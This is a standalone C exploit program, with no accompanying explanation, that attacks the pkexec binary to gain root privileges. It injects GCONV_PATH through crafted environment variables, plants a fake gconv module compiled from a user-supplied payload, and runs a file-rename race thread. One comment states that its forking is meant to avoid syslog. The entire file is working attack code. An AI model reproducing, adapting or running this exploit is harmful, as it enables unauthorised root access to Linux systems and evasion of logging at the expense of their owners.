#include <fcntl.h>
#include <pthread.h>
#include <stdatomic.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/file.h>
#include <sys/stat.h>
#include <unistd.h>

static char *pk_path = "/usr/bin/pkexec";
static char *lock_file = "/tmp/privlock";
static char *pk_args[] = {NULL};
static char *pk_envs[] = {"privesc", "PATH=GCONV_PATH=.", "CHARSET=PRIVESC",
                          NULL};

atomic_int halt = 0;

void read_payload(char *payload_file, char **payload_contents) {
  FILE *pfp = NULL;
  struct stat payload_stats = {0};
  size_t bytes_read = 0;

  if (NULL == payload_contents) {
    fprintf(stderr, "[-] Can't read to NULL ptr\n");
    goto exit;
  }

  if (0 > stat(payload_file, &payload_stats)) {
    fprintf(stderr, "[-] Failed to stat payload file\n");
    *payload_contents = NULL;
    goto exit;
  }

  if (NULL == (pfp = fopen(payload_file, "r"))) {
    fprintf(stderr, "[-] Failed to open payload file\n");
    *payload_contents = NULL;
    goto exit;
  }

  *payload_contents = calloc(payload_stats.st_size, sizeof(char));
  if (NULL == *payload_contents) {
    fprintf(stderr, "[-] Failed calloc for payload\n");
    *payload_contents = NULL;
    goto exit;
  }

  bytes_read =
      fread(*payload_contents, sizeof(char), payload_stats.st_size, pfp);
  if (bytes_read != payload_stats.st_size) {
    fprintf(stderr, "[-] Failed to read full payload: %ld of %ld\n", bytes_read,
            payload_stats.st_size);
    free(*payload_contents);
    *payload_contents = NULL;
  }

exit:
  if (NULL != pfp) {
    fclose(pfp);
  }
  return;
}

void setup(char *payload_file) {
  FILE *fp = NULL;
  FILE *pfp = NULL;
  char *pl_contents = NULL;

  if (NULL == payload_file) {
    fprintf(stderr, "[-] Payload file ptr null\n");
    goto fail;
  }

  read_payload(payload_file, &pl_contents);

  if (NULL == pl_contents) {
    fprintf(stderr, "[-] Unable to setup exploit\n");
    goto fail;
  }

  // reset folder, dont care if these fail
  remove(lock_file);

  // GCONV_PATH setup
  if ((0 != mkdir("GCONV_PATH=.", 0700)) ||
      (NULL == fopen("GCONV_PATH=./privesc", "w+")) ||
      (0 != chmod("GCONV_PATH=./privesc", S_IRWXU))) {

    fprintf(stderr, "[-] Failed to create GCONV_PATH files\n");
    goto fail;
  }

  // GConv Module Setup
  if ((0 != mkdir("privesc", 0700)) ||
      (NULL == (pfp = fopen("privesc/gconv-modules", "w+")))) {
    fprintf(stderr, "[-] Failed to create privesc files\n");
    goto fail;
  }
  fprintf(pfp, "%s", "module UTF-8// PRIVESC// privesc 2");
  fclose(pfp);

  // Malicious Module
  fp = fopen("privesc/privesc.c", "w");
  fprintf(fp, "%s", pl_contents);
  fclose(fp);
  free(pl_contents);

  if (0 !=
      system("gcc -o privesc/privesc.so -shared -fPIC privesc/privesc.c")) {
    fprintf(stderr, "[-] Failed to compile privesc\n");
    goto fail;
  }

  return;

fail:
  exit(EXIT_FAILURE);
}

void *race() {
  for (; 0 == halt;) {
    rename("GCONV_PATH=./privesc", "GCONV_PATH=./race");
    rename("GCONV_PATH=./race", "GCONV_PATH=./privesc");
  }

  return NULL;
}

void *pwn() {
  int lfd = open("/tmp/privlock", O_CREAT);

  // simple file lock; payload grabs lock on good run
  for (; 0 == flock(lfd, LOCK_EX | LOCK_NB);) {
    flock(lfd, LOCK_UN);
    if (0 == fork()) {
      // execve must be run in process with parent 1 to avoid syslog
      if (0 == fork()) {
        execve(pk_path, pk_args, pk_envs);
      }
      exit(EXIT_SUCCESS);
    }
  }

  // stop race thread
  // busywait while other payload runs
  halt = 1;
  flock(lfd, LOCK_EX);

  return NULL;
}

int main(int argc, char *argv[]) {
  int ret = 0;
  pthread_t pwn_id = 0;
  pthread_t race_id = 0;

  if (argc < 2 || argv[1] == NULL) {
    fprintf(stderr, "[-] Need Payload C File for Malicious SO\n");
    ret = 1;
    goto exit;
  }

  setup(argv[1]);

  // start thread to cause race condition
  pthread_create(&race_id, NULL, race, NULL);
  printf("[*] Started Race Thread\n");

  // race condition exploitation
  pthread_create(&pwn_id, NULL, pwn, NULL);
  printf("[*] Trying to win race\n");

  // join threads
  pthread_join(pwn_id, NULL);
  pthread_join(race_id, NULL);

exit:
  return ret;
}